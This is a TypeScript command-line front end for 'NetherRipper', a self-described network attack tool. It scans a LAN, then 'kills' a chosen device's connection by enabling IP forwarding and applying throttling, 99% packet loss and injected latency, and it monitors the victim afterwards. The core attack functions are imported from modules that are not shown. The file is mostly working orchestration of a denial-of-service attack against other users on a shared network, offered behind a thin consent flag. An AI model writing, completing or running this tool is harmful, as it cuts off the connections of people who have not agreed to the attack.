import chalk from 'chalk';
import { 
  getActiveInterface, 
  getNetworkInfo, 
  scanNetwork, 
  isTargetOnline 
} from './core/scanner';
import { 
  killTarget, 
  stopAttack, 
  validateTarget,
  checkIpForwarding,
  enableIpForwarding,
  monitorTarget
} from './core/killer';
import {
  loadState,
  saveState,
  addTarget,
  clearState,
  formatState,
  getTargets
} from './core/state';
import { 
  requireRoot, 
  checkDependencies,
  checkOptionalTools 
} from './core/exec';

/**
 * Show banner
 */
function showBanner(): void {
  console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║') + chalk.yellow.bold('  🔥 NETHERIPPER v2.0 - Network Destroyer  🔥  ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╠════════════════════════════════════════════════╣'));
  console.log(chalk.red.bold('║  ⚠️  WARNING: EXTREME NETWORK ATTACK TOOL      ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  🔒 Educational & Authorized Testing ONLY     ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  ⚖️  Unauthorized use is ILLEGAL              ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));
}

/**
 * Show help
 */
function showHelp(): void {
  console.log(chalk.cyan.bold('NetherRipper - Extreme Network Attack Tool\n'));
  console.log(chalk.white('Usage:'));
  console.log(chalk.gray('  sudo nr <command> [target]\n'));
  console.log(chalk.white('Commands:'));
  console.log(chalk.green('  scan             ') + chalk.gray('Scan network for devices'));
  console.log(chalk.green('  kill <IP>        ') + chalk.gray('Kill target bandwidth (EXTREME)'));
  console.log(chalk.green('  stop             ') + chalk.gray('Stop all attacks'));
  console.log(chalk.green('  status           ') + chalk.gray('Show active attacks'));
  console.log(chalk.green('  help             ') + chalk.gray('Show this help\n'));
  console.log(chalk.white('Examples:'));
  console.log(chalk.gray('  sudo nr scan'));
  console.log(chalk.gray('  sudo nr kill 192.168.1.100'));
  console.log(chalk.gray('  sudo nr stop\n'));
  console.log(chalk.dim('GitHub: https://github.com/yourusername/netheripper\n'));
}

/**
 * Check consent
 */
function checkConsent(): void {
  if (process.env.NETHER_CONSENT !== 'yes') {
    console.log(chalk.red('❌ Ethical consent required'));
    console.log(chalk.yellow('\nSet environment variable:'));
    console.log(chalk.white('  export NETHER_CONSENT=yes\n'));
    process.exit(1);
  }
}

/**
 * Command: scan
 */
async function cmdScan(): Promise<void> {
  console.log(chalk.cyan('🔍 Scanning network...\n'));

  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);

  console.log(chalk.gray(`Interface: ${iface}`));
  console.log(chalk.gray(`Network: ${networkInfo.networkAddress}/${networkInfo.subnet}`));
  console.log(chalk.gray(`Gateway: ${networkInfo.gateway}\n`));

  // Scan network
  const devices = await scanNetwork(networkInfo);

  if (devices.length === 0) {
    console.log(chalk.yellow('No devices found'));
    return;
  }

  // Display results
  console.log(chalk.cyan('Devices found:\n'));
  console.log(chalk.white('┌─────────────────┬───────────────────┬──────────────────────┐'));
  console.log(chalk.white('│ IP Address      │ MAC Address       │ Info                 │'));
  console.log(chalk.white('├─────────────────┼───────────────────┼──────────────────────┤'));

  for (const device of devices) {
    const ip = device.ip.padEnd(15);
    const mac = device.mac.padEnd(17);
    let info = device.vendor || 'Unknown';
    
    if (device.isGateway) {
      info = chalk.blue('[Gateway]');
    } else if (device.isOwn) {
      info = chalk.green('[You]');
    }

    console.log(`│ ${ip} │ ${mac} │ ${info.padEnd(20)} │`);
  }

  console.log(chalk.white('└─────────────────┴───────────────────┴──────────────────────┘\n'));
  console.log(chalk.green(`✓ Found ${devices.length} devices\n`));
}

/**
 * Command: kill
 */
async function cmdKill(targetIp: string): Promise<void> {
  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);

  // Validate target
  validateTarget(targetIp, networkInfo);

  // Check if target is online
  console.log(chalk.gray(`Checking if ${targetIp} is online...`));
  const isOnline = await isTargetOnline(targetIp);
  
  if (!isOnline) {
    console.log(chalk.yellow(`\n⚠️  Warning: Target ${targetIp} appears offline`));
    console.log(chalk.gray('Continuing anyway...\n'));
  }

  // Show warning
  console.log(chalk.red.bold('\n╔════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║  ⚠️  EXTREME NETWORK ATTACK                    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold(`║  Target: ${targetIp.padEnd(39)}') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  This WILL destroy their connection!           ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Press Ctrl+C to abort (3s)...                 ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚════════════════════════════════════════════════╝\n'));

  // Wait 3 seconds
  await new Promise(resolve => setTimeout(resolve, 3000));

  // Enable IP forwarding
  console.log(chalk.gray('Enabling IP forwarding...'));
  const forwarding = await checkIpForwarding();
  if (!forwarding) {
    await enableIpForwarding();
  }

  // Apply attack
  console.log(chalk.red(`\n💀 KILLING ${targetIp}...\n`));

  const rules = await killTarget({
    targetIp,
    interface: iface,
    gateway: networkInfo.gateway,
  });

  // Save state
  addTarget({
    ip: targetIp,
    mac: 'Unknown',
    startTime: new Date().toISOString(),
    rules,
  });

  console.log(chalk.green('✓ Bandwidth throttled (1KB/s)'));
  console.log(chalk.green('✓ Packet drop enabled (99%)'));
  console.log(chalk.green('✓ Latency injected (5000ms)'));

  console.log(chalk.red.bold(`\n💀 Target ${targetIp} is now DEAD\n`));
  console.log(chalk.yellow(`Run '${chalk.white('sudo nr stop')}' to restore\n`));

  // Monitor target
  console.log(chalk.gray('Monitoring target (Ctrl+C to stop)...\n'));
  
  let iterations = 0;
  const interval = setInterval(async () => {
    iterations++;
    const status = await monitorTarget(targetIp);
    
    if (status.alive) {
      console.log(chalk.gray(`[${new Date().toISOString()}] Target alive - Latency: ${status.latency?.toFixed(0)}ms`));
    } else {
      console.log(chalk.red(`[${new Date().toISOString()}] Target DEAD - No response`));
    }

    // Stop after 10 checks
    if (iterations >= 10) {
      clearInterval(interval);
      console.log(chalk.yellow('\nMonitoring stopped. Attack still active.'));
      console.log(chalk.gray(`Run 'sudo nr stop' to cleanup\n`));
    }
  }, 5000);
}

/**
 * Command: stop
 */
async function cmdStop(): Promise<void> {
  console.log(chalk.cyan('\n🛑 Stopping all attacks...\n'));

  const state = loadState();
  
  if (!state || state.targets.length === 0) {
    console.log(chalk.yellow('No active attacks to stop\n'));
    return;
  }

  const iface = await getActiveInterface();

  // Stop all attacks
  for (const target of state.targets) {
    console.log(chalk.gray(`Cleaning up rules for ${target.ip}...`));
    await stopAttack(iface, target.rules);
  }

  // Clear state
  clearState();

  console.log(chalk.green('\n✓ All attacks stopped'));
  console.log(chalk.green('✓ Network rules cleaned up\n'));
}

/**
 * Command: status
 */
async function cmdStatus(): Promise<void> {
  console.log(chalk.cyan('\n📊 NetherRipper Status\n'));
  
  const state = loadState();
  
  if (!state || state.targets.length === 0) {
    console.log(chalk.gray('No active attacks\n'));
    return;
  }

  console.log(chalk.white(formatState()));
}

/**
 * Main CLI
 */
async function main(): Promise<void> {
  const args = process.argv.slice(2);
  const command = args[0] || 'help';

  // Show help without checks
  if (command === 'help' || command === '--help' || command === '-h') {
    showHelp();
    return;
  }

  // Show banner
  showBanner();

  // Check consent
  checkConsent();

  // Check root for dangerous commands
  if (['kill', 'stop', 'scan'].includes(command)) {
    requireRoot();
  }

  // Check dependencies
  const missing = await checkDependencies();
  if (missing.length > 0) {
    console.log(chalk.red('❌ Missing required tools:'));
    for (const tool of missing) {
      console.log(chalk.gray(`   - ${tool}`));
    }
    console.log(chalk.yellow('\nInstall with: sudo apt install iproute2 iptables\n'));
    process.exit(1);
  }

  // Check optional tools
  const optional = await checkOptionalTools();
  if (!optional.arpScan && !optional.nmap) {
    console.log(chalk.yellow('⚠️  Tip: Install arp-scan or nmap for better scanning'));
    console.log(chalk.gray('   sudo apt install arp-scan\n'));
  }

  // Route commands
  try {
    switch (command) {
      case 'scan':
        await cmdScan();
        break;

      case 'kill': {
        const targetIp = args[1];
        if (!targetIp) {
          console.log(chalk.red('❌ Target IP required'));
          console.log(chalk.gray('   Usage: sudo nr kill <IP>\n'));
          process.exit(1);
        }
        await cmdKill(targetIp);
        break;
      }

      case 'stop':
        await cmdStop();
        break;

      case 'status':
        await cmdStatus();
        break;

      default:
        console.log(chalk.red(`❌ Unknown command: ${command}`));
        console.log(chalk.gray('   Run "nr help" for usage\n'));
        process.exit(1);
    }
  } catch (error) {
    console.error(chalk.red('\n❌ Error:'), error instanceof Error ? error.message : error);
    process.exit(1);
  }
}

// Handle Ctrl+C
process.on('SIGINT', async () => {
  console.log(chalk.yellow('\n\n⚠️  Interrupted by user'));
  console.log(chalk.white('   Run "sudo nr stop" to cleanup network rules\n'));
  process.exit(130);
});

// Run
main().catch(error => {
  console.error(chalk.red('Fatal error:'), error);
  process.exit(1);
});